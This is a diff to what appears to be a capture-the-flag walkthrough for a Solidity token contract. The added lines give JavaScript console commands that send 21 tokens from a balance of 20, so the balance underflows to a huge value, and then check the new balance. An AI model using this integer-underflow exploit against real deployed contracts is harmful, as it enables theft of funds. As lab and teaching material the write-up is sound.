@@ -186,4 +186,14 @@ function transfer(address _to, uint _value) public returns (bool) {
 }
 ```
 
-If you send as parameter any random address (different than yours) as a `_to` parameter and a `21` as a `_value` parameter. Your balance account will be `uint 20 - uint 21 = 2^256-1`.
+So we can simply send the following transaction and after that, our balance should be something like `1.157920892373162e+77`.
+
+```js
+await contract.transfer('<some_random_address>', 21);
+```
+
+Check your balance after the transaction:
+
+```js
+await contract.balanceOf(player).then(Number)
+```
